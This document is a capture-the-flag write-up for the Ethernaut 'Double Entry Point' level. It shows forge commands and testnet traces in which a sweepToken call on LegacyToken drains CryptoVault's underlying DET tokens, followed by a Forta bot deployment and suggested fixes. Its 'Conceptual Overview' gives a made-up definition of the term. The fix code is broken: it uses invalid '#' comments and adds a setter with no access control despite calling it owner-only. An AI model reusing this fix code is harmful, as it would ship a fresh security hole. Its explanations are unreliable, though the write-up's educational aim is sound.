# Double Entry Point

This level features a `CryptoVault` with special functionality, the `sweepToken` function. This is a common function used to retrieve tokens stuck in a contract. The `CryptoVault` operates with an `underlying` token that can't be swept, as it is an important core logic component of the `CryptoVault`. Any other tokens can be swept.

The underlying token is an instance of the DET token implemented in the `DoubleEntryPoint` contract definition and the `CryptoVault` holds 100 units of it. Additionally the `CryptoVault` also holds 100 of `LegacyToken LGT`.

In this level you should figure out where the bug is in `CryptoVault` and protect it from being drained out of tokens.

The contract features a `Forta` contract where any user can register its own `detection bot` contract. `Forta` is a decentralized, community-based monitoring network to detect threats and anomalies on DeFi, NFT, governance, bridges and other Web3 systems as quickly as possible. Your job is to implement a detection bot and register it in the `Forta` contract. The bot's implementation will need to raise correct alerts to prevent potential attacks or bug exploits.

[Contract ABI Specification](https://docs.soliditylang.org/en/latest/abi-spec.html#contract-abi-specification)

[Forta docs](https://docs.forta.network/en/latest/quickstart/)

## Double Entry Point (DEP)

A `Double Entry Point (DEP)` in the context of token contracts is a security mechanism designed to protect smart contracts, especially those handling tokens, from unauthorized access or vulnerabilities.

While the term `Double Entry Point` isn't standard in Ethereum or smart contract development, the concept can be inferred to involve an additional layer of security or validation before certain actions can be performed, particularly those that could lead to the unauthorized movement of tokens.

### Conceptual Overview

1. `Standard Token Contract`: A typical token contract allows users to transfer tokens from one account to another. It includes functions like `transfer` and `approve`, which, if not properly secured, could be exploited.
2. `Double Entry Point Mechanism`: Introduces an additional layer or checkpoint before executing sensitive operations. This could be implemented in various ways, such as:
   - `Proxy Contracts`: A `DEP` might use a proxy contract that forwards calls to the main token contract. The proxy can contain additional checks or logic to validate transactions before they reach the token contract.
   - `Detection Bots`: A system like `Forta` allows for the registration of detection bots. These bots can monitor transactions for suspicious activity and potentially halt or flag transactions before they are executed, acting as a `DEP` by providing an additional validation step.


## Vulnerability

1. Initial setup:
   1. `CryptoVault` holds DET tokens and possibly other ERC20 tokens.
   2. `LegacyToken (LGT)` is an ERC20 token with an added delegation feature.
   3. `DoubleEntryPoint` is another ERC20 token (`DET`) that implements `DelegateERC20^ for delegation purposes and has a reference to `CryptoVault`.
2. Safeguard:
   1. `CryptoVault` has a `sweepToken` function designed to transfer any ERC20 token it holds to a predefined recipient, except for its underlying token (`DET` in this case), to prevent draining the vault of its primary asset.
3. Attack:
   1. The attacker notices that `LegacyToken (LGT)` can delegate its transfer function to another contract (`DoubleEntryPoint`) through `delegate.delegateTransfer`.
   2. The attacker invokes `sweepToken` on `CryptoVault`, specifying the `LGT` token as the token to sweep.
   3. `CryptoVault` checks if `LGT` is the underlying token (`DET`), which it's not, so it proceeds.
   4. `CryptoVault` calls `LGT.transfer`, intending to transfer LGT tokens.
4. Exploiting the delegation:
   1. `LegacyToken`'s `transfer` function is overridden to delegate the transfer to `DoubleEntryPoint` if a delegate is set.
   2. The call becomes `DoubleEntryPoint.delegateTransfer`, with the `to` parameter being the `sweptTokensRecipient`, the `value` being `CryptoVault`'s total balance of `LGT`, and `msg.sender` being `CryptoVault`.
5. Bypassing Safeguards:
   1. In `DoubleEntryPoint`, the `delegateTransfer` function checks if `msg.sender` is the `LegacyToken` contract, which it is, thus bypassing the `onlyDelegateFrom` modifier.
   2. The `fortaNotify` modifier is designed to interact with a `Forta` detection bot but does not prevent the transfer.
   3. `DoubleEntryPoint` then transfers `DET` tokens (the underlying asset of `CryptoVault` that was supposed to be safeguarded) to the specified recipient, effectively draining the vault of its primary asset.

## Attack

1. Context scan.

```bash
forge script script/DoubleEntryPointScan.s.sol --rpc-url $ALCHEMY_RPC_URL --private-key $PRIVATE_KEY --broadcast --legacy -vvvv

Traces:
  [19238] DoubleEntryPointScan::run()
    ├─ [0] VM::startBroadcast()
    │   └─ ← [Return] 
    ├─ [2404] 0x055b8Ca8dd26e6932E24dB7F9c2e0569faAE770C::cryptoVault() [staticcall]
    │   └─ ← [Return] 0xFAf657dB02Db174eB45eC8A0f5C8C45E0F1c9760 # CryptoVault contract
    ├─ [2347] 0xFAf657dB02Db174eB45eC8A0f5C8C45E0F1c9760::underlying()
    │   └─ ← [Return] 0x055b8Ca8dd26e6932E24dB7F9c2e0569faAE770C # DoubleEntryPoint/Ethernaut contract
    ├─ [2383] 0x055b8Ca8dd26e6932E24dB7F9c2e0569faAE770C::delegatedFrom() [staticcall]
    │   └─ ← [Return] 0x9220518ea80d4014e1895dba20B7F77f5655E57B # Legacy token contract
    ├─ [0] VM::stopBroadcast()
    │   └─ ← [Return] 
    └─ ← [Stop]
```

2. Deploy `DoubleEntryPointAttack` contract to swept DET tokens.

```bash
forge script script/DeployDoubleEntryPointAttack.s.sol --rpc-url $ALCHEMY_RPC_URL --private-key $PRIVATE_KEY --broadcast --verify --etherscan-api-key $ETHERSCAN_API_KEY -vvvv --legacy

Traces:
  [116080] DeployDoubleEntryPointAttack::run()
    ├─ [0] VM::startBroadcast()
    │   └─ ← [Return] 
    ├─ [2404] 0x055b8Ca8dd26e6932E24dB7F9c2e0569faAE770C::cryptoVault() [staticcall]
    │   └─ ← [Return] 0xFAf657dB02Db174eB45eC8A0f5C8C45E0F1c9760
    ├─ [2347] 0xFAf657dB02Db174eB45eC8A0f5C8C45E0F1c9760::underlying() [staticcall]
    │   └─ ← [Return] 0x055b8Ca8dd26e6932E24dB7F9c2e0569faAE770C
    ├─ [2383] 0x055b8Ca8dd26e6932E24dB7F9c2e0569faAE770C::delegatedFrom() [staticcall]
    │   └─ ← [Return] 0x9220518ea80d4014e1895dba20B7F77f5655E57B
    ├─ [57067] 0xFAf657dB02Db174eB45eC8A0f5C8C45E0F1c9760::sweepToken(0x9220518ea80d4014e1895dba20B7F77f5655E57B)
    │   ├─ [2557] 0x9220518ea80d4014e1895dba20B7F77f5655E57B::balanceOf(0xFAf657dB02Db174eB45eC8A0f5C8C45E0F1c9760) [staticcall]
    │   │   └─ ← [Return] 100000000000000000000 [1e20]
    │   ├─ [48677] 0x9220518ea80d4014e1895dba20B7F77f5655E57B::transfer(0x64Dd9D94818A2CA2e95c31B084aeF0CC92e86dA2, 100000000000000000000 [1e20])
    │   │   ├─ [45519] 0x055b8Ca8dd26e6932E24dB7F9c2e0569faAE770C::delegateTransfer(0x64Dd9D94818A2CA2e95c31B084aeF0CC92e86dA2, 100000000000000000000 [1e20], 0xFAf657dB02Db174eB45eC8A0f5C8C45E0F1c9760)
    │   │   │   ├─ [2573] 0xe3F601d50e9f312ddDc250f00176D2f5619d1785::usersDetectionBots(0x64Dd9D94818A2CA2e95c31B084aeF0CC92e86dA2) [staticcall]
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   │   │   ├─ [2541] 0xe3F601d50e9f312ddDc250f00176D2f5619d1785::botRaisedAlerts(0x0000000000000000000000000000000000000000) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   ├─ [758] 0xe3F601d50e9f312ddDc250f00176D2f5619d1785::notify(0x64Dd9D94818A2CA2e95c31B084aeF0CC92e86dA2, 0x9cd1a12100000000000000000000000064dd9d94818a2ca2e95c31b084aef0cc92e86da20000000000000000000000000000000000000000000000056bc75e2d63100000000000000000000000000000faf657db02db174eb45ec8a0f5c8c45e0f1c9760)
    │   │   │   │   └─ ← [Stop] 
    │   │   │   ├─ emit Transfer(from: 0xFAf657dB02Db174eB45eC8A0f5C8C45E0F1c9760, to: 0x64Dd9D94818A2CA2e95c31B084aeF0CC92e86dA2, value: 100000000000000000000 [1e20])
    │   │   │   ├─ [541] 0xe3F601d50e9f312ddDc250f00176D2f5619d1785::botRaisedAlerts(0x0000000000000000000000000000000000000000) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   └─ ← [Stop] 
    ├─ [0] VM::stopBroadcast()
    │   └─ ← [Return] 
    └─ ← [Stop]

# https://sepolia.etherscan.io/tx/0x6ffc455b6abc65384b1972b93d1a5b29ce9b47cbfe4e43453f9a07f1e0256ac3
```

## Forta Bot

1. Deploy `FortaBot`

```bash
forge script script/DeployFortaBot.s.sol --rpc-url $ALCHEMY_RPC_URL --private-key $PRIVATE_KEY --broadcast --legacy -vvvv

Traces:
  [193286] RegisterBot::run()
    ├─ [0] VM::startBroadcast()
    │   └─ ← [Return] 
    ├─ [100478] → new FortaBot@0x6108Bb9aB947A05C2b39926a1da9e4dAA8852A6d
    │   └─ ← [Return] 390 bytes of code
    ├─ [2381] 0xd2ed0d4BcB72DaD1f452a1Fb865EE326c27AD865::forta() [staticcall]
    │   └─ ← [Return] 0xd947c7EA648780B416ebA96fCa13FB7D63aeDD30
    ├─ [22515] 0xd947c7EA648780B416ebA96fCa13FB7D63aeDD30::setDetectionBot(FortaBot: [0x6108Bb9aB947A05C2b39926a1da9e4dAA8852A6d])
    │   └─ ← [Stop] 
    ├─ [0] VM::stopBroadcast()
    │   └─ ← [Return] 
    └─ ← [Stop]
```

## Fix

1. Enhance CryptoVault's safeguard against delegated transfers:
   1. Modify the `sweepToken` function in CryptoVault to check not only if the token is the underlying token but also if the token has delegation capabilities that could potentially be used to transfer the underlying token indirectly.
   2. This can be achieved by maintaining a list of tokens with delegation capabilities and checking against it before proceeding with the sweep.

2. Introduce a whitelist mechanism in `DoubleEntryPoint`:
   1. Implement a whitelist mechanism in `DoubleEntryPoint` that restricts which contracts or addresses can call `delegateTransfer`. This whitelist should only include addresses that are known to not cause unintended transfers of `DET` tokens.
   2. `CryptoVault` should manage this whitelist, adding or removing tokens based on their delegation capabilities and potential risk.

3. Expand FortaBot rules as needed. 

```bash
# Modifications in CryptoVault
contract CryptoVault {
    ...
    # Add a mapping to track tokens with known delegation capabilities
    mapping(address => bool) public tokensWithDelegation;

    function setTokenDelegationCapability(address token, bool hasDelegation) public {
        // Only callable by the owner or through a governance mechanism
        tokensWithDelegation[token] = hasDelegation;
    }

    function sweepToken(IERC20 token) public {
        require(token != underlying, "Can't transfer underlying token");
        require(!tokensWithDelegation[address(token)], "Token has delegation capabilities");
        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));
    }
    ...
}

# Modifications in DoubleEntryPoint
contract DoubleEntryPoint {
    ...
    # Whitelist mechanism
    mapping(address => bool) public whitelist;

    function addToWhitelist(address addr) public onlyOwner {
        whitelist[addr] = true;
    }

    function removeFromWhitelist(address addr) public onlyOwner {
        whitelist[addr] = false;
    }

    modifier onlyWhitelisted() {
        require(whitelist[msg.sender], "Not whitelisted");
        _;
    }

    function delegateTransfer(address to, uint256 value, address origSender)
        public
        override
        onlyDelegateFrom
        onlyWhitelisted // Apply the whitelist check
        fortaNotify
        returns (bool)
    {
        _transfer(origSender, to, value);
        return true;
    }
    ...
}
```
